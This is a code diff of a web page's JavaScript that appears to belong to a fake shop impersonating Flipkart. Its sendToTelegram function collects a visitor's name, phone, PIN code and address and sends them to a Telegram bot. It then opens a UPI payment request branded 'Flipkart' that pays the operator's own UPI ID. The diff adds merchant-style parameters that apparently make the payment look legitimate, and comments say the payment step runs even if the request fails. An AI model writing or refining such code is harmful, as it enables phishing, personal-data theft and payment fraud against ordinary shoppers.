@@ -214,7 +214,7 @@
             }
         }
 
-        async function sendToTelegram() {
+       async function sendToTelegram() {
             const name = document.getElementById('uName').value;
             const phone = document.getElementById('uPhone').value;
             const pin = document.getElementById('uPin').value;
@@ -227,17 +227,22 @@
 
             const msg = `📦 *ORDER RECEIVED* 📦\n\n👤 *User:* ${name}\n📞 *Phone:* ${phone}\n🛍️ *Item:* ${selectedProductName}\n💰 *Price:* ₹${selectedProductPrice}\n📍 *Pin:* ${pin}\n🏙️ *City:* ${city}\n🏠 *Addr:* ${house}`;
 
+            // --- Yahan se Error Fix Hai ---
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
                 });
-                window.location.href = `upi://pay?pa=${MY_UPI_ID}&pn=Flipkart&am=${selectedProductPrice}&cu=INR`;
+                
+                // Success hone par payment pe bhejo
+                window.location.href = `upi://pay?pa=${MY_UPI_ID}&pn=Flipkart&am=${selectedProductPrice}&cu=INR&mode=02&purpose=00&orgid=159761`;
+                
             } catch(e) {
-                window.location.href = `upi://pay?pa=${MY_UPI_ID}&pn=Flipkart&am=${selectedProductPrice}&cu=INR`;
+                // Agar net ki wajah se error aaye tab bhi payment pe bhejo
+                window.location.href = `upi://pay?pa=${MY_UPI_ID}&pn=Flipkart&am=${selectedProductPrice}&cu=INR&mode=02&purpose=00&orgid=159761`;
             }
-        }
+        } // Ye wala bracket function band karta hai
 
         function showPage(id) {
             document.getElementById('page-home').classList.add('hidden');
